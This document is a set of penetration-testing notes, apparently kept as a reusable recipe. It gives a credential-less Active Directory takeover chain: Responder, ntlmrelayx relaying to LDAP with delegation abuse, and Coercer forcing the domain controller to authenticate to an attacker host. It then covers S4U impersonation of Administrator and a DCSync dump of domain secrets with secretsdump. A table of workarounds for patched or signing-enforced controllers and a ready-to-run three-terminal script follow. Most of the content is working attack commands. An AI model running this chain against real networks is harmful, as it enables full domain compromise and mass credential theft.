# [2026-04] NTLM Relay + Coercer → Domain management permissions (no password required)

## Scene classification
Penetration Testing/Intranet/AD Attack

## Goal Overview
When the intranet access point has been obtained but without any credentials, the domain management authority is obtained through the NTLM Relay attack chain.

## Complete execution link

1. After accessing the intranet, start Responder monitoring (close SMB/HTTP)
```bash
# edit /etc/responder/Responder.conf
# SMB = Off, HTTP = Off
responder -I eth0 -v
```

2. Start ntlmrelayx relay to LDAP (for AD CS attacks)
```bash
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
```

3. Use Coercer to force DC to authenticate to us
```bash
coercer coerce -u '' -p '' -d domain.local \
-l attacker_ip -t dc01.domain.local --always-continue
```

4. DC’s machine account NTLM authentication is relayed to LDAP
5. ntlmrelayx automatically creates machine accounts and configures constrained delegation
6. Use S4U2Self + S4U2Proxy to simulate domain management
```bash
getST.py -spn cifs/dc01.domain.local \
-impersonate Administrator \
domain.local/CREATED_MACHINE\$:'password' -dc-ip 10.0.0.1
```

7. Using Ticket DCSync
```bash
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass dc01.domain.local
```

## Trampling on pit records

| Problem | Cause | Solution | Time consuming |
|------|------|---------|------|
| Coercer cannot trigger authentication | Target DC has been patched to disable PetitPotam | Switch to PrinterBug (MS-RPRN) | 30min |
| ntlmrelayx reports LDAP signing required | DC has LDAP signing enabled | Relay to LDAPS (636) or HTTP AD CS instead | 20min |
| The created machine account cannot be S4U | Domain policy limits the number of machine accounts created | Replace with an existing low-privilege domain user account | 15min |

## Toolchain discovery
- Coercer is more convenient than manually calling PetitPotam, automatically trying multiple protocols
- The `--delegate-access` parameter of ntlmrelayx is the key to automatically complete the delegation configuration
- If LDAP signing is enabled, can instead relay to AD CS's HTTP endpoint (ESC8)

## Key code/command

```bash
# Full Attack Chain One-Stop Service (Requires 3 Terminals)
# Terminal 1: Responder
responder -I eth0 -v

# Terminal 2: ntlmrelayx
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user attacker

# Terminal 3: Coercer
coercer coerce -u '' -p '' -d domain.local -l attacker_ip -t dc01.domain.local
```

## Reusable patterns/script snippets

```bash
# Quickly Testing NTLM Relay Feasibility
# 1. Check SMB signature
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 2. Check LDAP signature
crackmapexec ldap dc01.domain.local -u '' -p '' -M ldap-checker

# 3. Check Triggerable Protocols
coercer scan -u user -p pass -d domain.local -t dc01.domain.local
```

## Suggestions for improving this package
- Coercer and Responder are already in routing and bootstrap ✓
- ntlmrelayx belongs to the impacket package and is pre-installed by Kali ✓

## Evolution action
- [x] No update required (overridden)

## Environment information
- Kali 2026.1, impacket 0.12.0, coercer 2.4.3
- Target: Windows Server 2022 DC, domain functional level 2016
- Prerequisite: There is an intranet access point (obtained through VPN vulnerability)